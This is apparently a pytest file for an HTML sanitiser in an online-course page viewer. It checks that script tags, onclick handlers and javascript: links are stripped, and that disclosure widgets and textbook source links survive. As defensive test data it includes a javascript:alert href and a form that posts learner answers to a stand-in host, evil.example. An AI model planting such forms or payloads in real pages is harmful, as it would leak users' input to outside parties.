"""``sanitize_soup`` JS-free-reveal + source-provenance-link survival tests.

Two Studio-surfacing guarantees the shared active-content sanitiser must hold
(``gui.services.source_page.sanitize_soup``, reused by the IMSCC page-serving
path and the source-doc viewer):

* **Finding 13** — self-check reveals must work JS-free. Generated 7B pages use
  native ``<details><summary>`` (no JS), the Sonnet baseline used
  ``<button>`` + ``<script>`` (JS, intentionally stripped). The sanitiser must
  KEEP ``<details>`` / ``<summary>`` (and their content) intact so the native
  browser toggle renders + works inside the sandboxed iframe, while still
  stripping the ``<script>`` + inline ``on*`` handlers.

* **Finding 3** — where a content block carries source provenance surfaced as an
  ``<a href>`` link to the accessible-HTML passage (``#anchor``), the viewer must
  NOT strip that link. The sanitiser must keep a same-document / API-relative
  anchor while still rejecting ``javascript:`` URLs.

Pure-unit (no FastAPI / TestClient); only ``bs4`` is required.
"""

from __future__ import annotations

import pytest

pytest.importorskip("bs4")

from bs4 import BeautifulSoup  # noqa: E402

from gui.services.source_page import sanitize_soup  # noqa: E402


def _scrub(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    sanitize_soup(soup)
    return str(soup)


def _scrub_assessment(html: str) -> str:
    """The assessment/discussion-path scrub (W10 §5.3 — strips form actions)."""
    soup = BeautifulSoup(html, "html.parser")
    sanitize_soup(soup, strip_form_actions=True)
    return str(soup)


# --------------------------------------------------------------------------- #
# Finding 13 — native <details><summary> survives (JS-free reveal)
# --------------------------------------------------------------------------- #


def test_details_summary_survive_sanitize():
    out = _scrub(
        "<details><summary>Show answer</summary>"
        "<p>The correct answer is 10.</p></details>"
    )
    # The native disclosure widget + its content are intact (renders + toggles
    # in the sandbox with zero JS).
    assert "<details>" in out
    assert "<summary>" in out
    assert "Show answer" in out
    assert "The correct answer is 10." in out


def test_details_kept_but_script_and_handlers_stripped():
    # The Sonnet-style <button>+<script> reveal IS stripped (expected); the
    # native <details> alongside it survives.
    out = _scrub(
        '<details><summary>Reveal</summary><p>42</p></details>'
        '<button onclick="toggleAnswer(1)">Show Answer</button>'
        "<script>function toggleAnswer(){}</script>"
    )
    assert "<details>" in out and "<summary>" in out
    assert "<script" not in out
    assert "onclick" not in out
    # The button element itself survives (only its handler is stripped) — the
    # JS-free path is the <details>, not the (now-inert) button.
    assert "Show Answer" in out


# --------------------------------------------------------------------------- #
# Finding 3 — source-provenance <a href> link survives
# --------------------------------------------------------------------------- #


def test_source_provenance_link_survives_sanitize():
    # A content block carrying provenance, surfaced as a deep link into the
    # accessible HTML passage (the same dart:<src>#<anchor> the leak-sanitiser
    # strips elsewhere — here it must be KEPT as a navigable link).
    href = "/api/learn/source/my-course?item_path=ch1.html#dart-abc123"
    out = _scrub(
        f'<div class="example" data-cf-source-ids="dart:ch1#abc123">'
        f'<a class="source-link" href="{href}">View in textbook</a>'
        f"<p>Worked example.</p></div>"
    )
    assert "View in textbook" in out
    assert "item_path=ch1.html" in out
    # The provenance attribute is preserved too (not a URL-bearing attr).
    assert "data-cf-source-ids" in out


def test_javascript_href_still_stripped_on_link():
    out = _scrub('<a href="javascript:alert(1)">bad</a>')
    assert "javascript:alert" not in out
    # The element survives; only the active href is removed.
    assert ">bad<" in out


def test_details_open_attribute_survives_sanitize():
    # A <details open> (default-expanded reveal) keeps its ``open`` attribute —
    # ``open`` is neither an on* handler nor a URL-bearing attr, so the scrub
    # leaves it (the reveal renders expanded, JS-free).
    out = _scrub("<details open><summary>S</summary><p>body</p></details>")
    assert "open" in out
    assert "<details" in out and "<summary>" in out


# --------------------------------------------------------------------------- #
# Finding 3 — ``data-cf-source-ids`` is consumed into clickable source links
# (the page-serving transform, not the bare scrub).
# --------------------------------------------------------------------------- #


def test_page_transform_injects_source_links_from_cf_ids():
    from gui.services.imscc_service import _sanitize_page

    # A grounded example block carrying provenance ids but ZERO hrefs (the 7B
    # render defect): the page transform must mint a "View in textbook" deep
    # link per parseable id into the served /source-doc accessible HTML.
    out = _sanitize_page(
        '<div class="example" data-cf-source-ids="dart:ch1#abc-123">'
        "<p>A worked example.</p></div>",
        slug="my-course",
    )
    assert "View in textbook" in out
    # ``&`` serializes as ``&amp;`` in the rendered HTML attribute.
    assert "/api/courses/my-course/source-doc?doc=ch1&amp;ref=abc-123" in out
    assert "#dart-abc-123" in out
    # The provenance attribute is preserved alongside the new link.
    assert "data-cf-source-ids" in out


def test_page_transform_source_links_multi_id_and_dedup():
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a, dart:ch2#b, dart:ch1#a">x</div>',
        slug="c1",
    )
    # Two distinct ids → two links; the duplicate is collapsed.
    assert out.count("View in textbook") == 2
    assert "doc=ch1&amp;ref=a" in out and "doc=ch2&amp;ref=b" in out


def test_page_transform_same_doc_collapses_to_one_link():
    from gui.services.imscc_service import _sanitize_page

    # Issue I4 (the bug): a grounded block carries MANY distinct chunk-ids that
    # all resolve to the SAME source doc (no data-dart-pages — the real-corpus
    # shape). The consolidated transform must emit EXACTLY ONE "View in textbook"
    # link, not one per chunk-id (the link wall).
    ids = ", ".join("dart:ch1#b{}".format(i) for i in range(22))
    out = _sanitize_page(
        '<div class="worked_example" data-cf-source-ids="{}">'
        "<p>A worked example.</p></div>".format(ids),
        slug="my-course",
    )
    assert out.count("View in textbook") == 1
    # The surviving link points at the doc's first anchor.
    assert "doc=ch1&amp;ref=b0" in out


def test_page_transform_caps_links_at_max():
    from gui.services.imscc_service import _sanitize_page
    from gui.services.imscc_service import MAX_SOURCE_LINKS

    # Ids spanning MORE than MAX_SOURCE_LINKS distinct docs → at most
    # MAX_SOURCE_LINKS links survive (no link wall even across many docs).
    n_docs = MAX_SOURCE_LINKS + 4
    ids = ", ".join("dart:ch{0}#a{0}".format(i) for i in range(n_docs))
    out = _sanitize_page(
        '<div data-cf-source-ids="{}">x</div>'.format(ids),
        slug="c1",
    )
    assert out.count("View in textbook") == MAX_SOURCE_LINKS


def test_page_transform_prefers_primary_anchor_for_doc():
    from gui.services.imscc_service import _sanitize_page

    # Purposeful-link integrity: when many chunk-ids of one doc collapse to a
    # single link, the surviving anchor PREFERS the wrapper's
    # data-cf-source-primary token (not merely the first token), and it resolves
    # through the /source-doc route.
    out = _sanitize_page(
        '<div class="worked_example" '
        'data-cf-source-ids="dart:ch1#b0, dart:ch1#b1, dart:ch1#b2" '
        'data-cf-source-primary="dart:ch1#b1">'
        "<p>A worked example.</p></div>",
        slug="my-course",
    )
    assert out.count("View in textbook") == 1
    # The primary anchor (b1) is the surviving deep link, through /source-doc.
    assert "/api/courses/my-course/source-doc?doc=ch1&amp;ref=b1" in out
    assert "#dart-b1" in out
    # The non-primary first token (b0) is NOT the surviving link.
    assert "ref=b0" not in out


def test_page_transform_no_slug_skips_injection():
    from gui.services.imscc_service import _sanitize_page

    # No course context → pure str->str transform, no links minted.
    out = _sanitize_page('<div data-cf-source-ids="dart:ch1#a">x</div>')
    assert "View in textbook" not in out
    assert "cf-source-links" not in out


def test_page_transform_ignores_unparseable_source_ids():
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div data-cf-source-ids="not-a-dart-id">x</div>', slug="c1"
    )
    assert "View in textbook" not in out


def test_page_transform_injects_no_script_or_handlers():
    from gui.services.imscc_service import _sanitize_page

    # The injected source-link nav is anchors-only: no script, no onclick.
    out = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a">x</div>', slug="c1"
    )
    assert "<script" not in out
    assert "onclick" not in out
    assert "javascript:" not in out


# Finding (page-number deep-links, Phase 2) — "View in textbook" carries the
# physical page (data-dart-pages) into the href + an honest "PDF p. N" label.


def test_page_transform_source_link_carries_page():
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div class="example" data-cf-source-ids="dart:ch1#abc-123" '
        'data-dart-pages="47"><p>A worked example.</p></div>',
        slug="my-course",
    )
    # &page=47 threaded into the href (before the #dart- fragment).
    assert "/api/courses/my-course/source-doc?doc=ch1&amp;ref=abc-123&amp;page=47" in out
    assert "#dart-abc-123" in out
    # Honest physical-page label in the link text (RISK-A: "PDF p.", not "p.").
    assert "View in textbook (PDF p. 47)" in out


def test_page_transform_source_link_range_targets_first_page():
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a" data-dart-pages="3-5">x</div>',
        slug="c1",
    )
    # RISK-C: a "3-5" range deep-links page 3, labels "PDF pp. 3, 4, 5".
    assert "&amp;page=3#dart-a" in out
    assert "(PDF pp. 3, 4, 5)" in out


def test_page_transform_source_link_page_less_byte_identical():
    from gui.services.imscc_service import _sanitize_page

    # No data-dart-pages → byte-identical to the legacy link (no &page=, fixed
    # "View in textbook" text).
    out = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a">x</div>', slug="c1"
    )
    assert ">View in textbook</a>" in out
    assert "&amp;page=" not in out
    assert "PDF p." not in out


# --------------------------------------------------------------------------- #
# Page-number printed-label accuracy — data-dart-page-kind makes the label
# honest about printed (bare "p. N") vs physical/absent ("PDF p. N").
# --------------------------------------------------------------------------- #


def test_page_transform_source_link_printed_kind_bare_p():
    """``data-dart-page-kind="printed"`` → honest book "p. N" (no "PDF")."""
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div class="example" data-cf-source-ids="dart:ch1#abc-123" '
        'data-dart-pages="47" data-dart-page-kind="printed">'
        "<p>A worked example.</p></div>",
        slug="my-course",
    )
    # Still deep-links page 47, but labels the genuine printed page.
    assert "&amp;page=47" in out
    assert "View in textbook (p. 47)" in out
    assert "PDF p. 47" not in out


def test_page_transform_source_link_interpolated_kind_bare_p():
    """``interpolated`` is a derived BOOK page → bare "pp. 3, 4, 5"."""
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a" data-dart-pages="3-5" '
        'data-dart-page-kind="interpolated">x</div>',
        slug="c1",
    )
    assert "(pp. 3, 4, 5)" in out
    assert "PDF" not in out


def test_page_transform_source_link_physical_kind_pdf_p():
    """Explicit ``physical`` → "PDF p. N" (anti-fabrication: never upgraded)."""
    from gui.services.imscc_service import _sanitize_page

    out = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a" data-dart-pages="47" '
        'data-dart-page-kind="physical">x</div>',
        slug="c1",
    )
    assert "View in textbook (PDF p. 47)" in out


def test_page_transform_source_link_absent_kind_byte_identical_pdf():
    """No ``data-dart-page-kind`` → physical default → "PDF p. N" (no-regression).

    Byte-identical to today's output (the whole corpus carries no kind attr).
    """
    from gui.services.imscc_service import _sanitize_page

    with_kind = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a" data-dart-pages="47" '
        'data-dart-page-kind="physical">x</div>',
        slug="c1",
    )
    without_kind = _sanitize_page(
        '<div data-cf-source-ids="dart:ch1#a" data-dart-pages="47">x</div>',
        slug="c1",
    )
    # An absent kind labels EXACTLY as an explicit physical kind.
    assert "View in textbook (PDF p. 47)" in without_kind
    assert "View in textbook (PDF p. 47)" in with_kind


# --------------------------------------------------------------------------- #
# W10 §5.3 — assessment-path sanitize strips off-origin <form action>
# --------------------------------------------------------------------------- #


def test_assessment_form_action_stripped():
    """A cartridge-authored ``<form action="https://evil/">`` loses its action on
    the assessment/discussion path (no off-origin exfiltration of learner input).

    The DEFAULT content-page scrub is unchanged (no-regression): an ``https:``
    action survives there because it is not an active scheme — the action-strip is
    OPT-IN to the assessment path only.
    """
    evil = (
        '<form action="https://evil.example/collect" method="post">'
        '<input name="answer"><button formaction="https://evil.example/f">go</button>'
        "</form>"
    )

    # Assessment path: BOTH action + formaction are gone; the form + inputs stay.
    hardened = _scrub_assessment(evil)
    assert "https://evil.example" not in hardened
    assert "action" not in hardened  # neither action= nor formaction=
    assert "<form" in hardened  # the element survives — only the target is removed
    assert "<input" in hardened

    # No-regression: the DEFAULT content-page scrub keeps the https action (the
    # scheme is not active), so existing callers are byte-identical.
    default = _scrub(evil)
    assert 'action="https://evil.example/collect"' in default

    # <details> still survives the assessment-path scrub (no over-stripping).
    details_out = _scrub_assessment(
        "<details><summary>Show</summary><p>body</p></details>"
        '<form action="https://evil/"><input></form>'
        '<button onclick="x()">b</button><script>x()</script>'
    )
    assert "<details>" in details_out and "<summary>" in details_out
    assert "body" in details_out
    # ...while the assessment-path scrub still strips script + on* handlers + action.
    assert "<script" not in details_out
    assert "onclick" not in details_out
    assert 'action="https://evil/"' not in details_out
